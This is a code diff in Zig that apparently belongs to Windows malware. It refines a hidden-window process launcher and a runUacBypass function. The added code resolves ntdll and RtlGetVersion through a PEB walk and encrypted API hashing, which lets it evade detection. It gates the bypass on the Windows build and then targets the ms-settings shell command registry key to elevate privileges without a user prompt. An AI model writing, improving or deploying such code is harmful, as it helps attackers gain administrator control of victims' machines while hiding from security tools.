@@ -113,10 +113,9 @@ fn createProcessAndWait(cmd: []const u8) bool {
     while (i < cmd.len and i < 511) : (i += 1) cmd_us[i] = cmd[i];
     cmd_us[i] = 0;
 
-    var si: [68]u8 = undefined;
-    @memset(&si, 0);
-    var pi: [16]u8 = undefined;
-    @memset(&pi, 0);
+    var si = std.mem.zeroes(types.STARTUPINFOW);
+    si.cb = @sizeOf(types.STARTUPINFOW);
+    var pi = std.mem.zeroes(types.PROCESS_INFORMATION);
 
     const CREATE_NO_WINDOW: u32 = 0x08000000;
     const ok = CreateProcessWFn(null, cmd_us[0..i+1:0], null, null, 0, CREATE_NO_WINDOW, null, null, @as(*const anyopaque, @ptrCast(&si)), @as(*anyopaque, @ptrCast(&pi)));
@@ -126,6 +125,20 @@ fn createProcessAndWait(cmd: []const u8) bool {
 
 pub fn runUacBypass(exe_path: []const u8) bool {
     if (isElevated()) return true;
+
+    const ntdll = peb_walk.getModuleByHash(hash.encryptedHashModule("ntdll.dll")) orelse return false;
+    const RtlGetVersion = export_resolve.getFunctionByHash(ntdll, hash.encryptedHashFunc("RtlGetVersion")) orelse return false;
+    const RtlGetVersionFn: *const fn (info: *anyopaque) callconv(.winapi) i32 = @ptrCast(@alignCast(RtlGetVersion));
+
+    var osvi: [284]u8 = undefined;
+    @memset(&osvi, 0);
+    @as(*align(1) u32, @ptrCast(&osvi)).* = @sizeOf(@TypeOf(osvi));
+    if (RtlGetVersionFn(&osvi) < 0) return false;
+
+    const major = @as(*align(1) u32, @ptrCast(&osvi[4])).*;
+    const build = @as(*align(1) u32, @ptrCast(&osvi[12])).*;
+
+    if (major >= 10 and build >= 18362) return false;
 
     const reg_key = "Software\\Classes\\ms-settings\\shell\\open\\command";
 
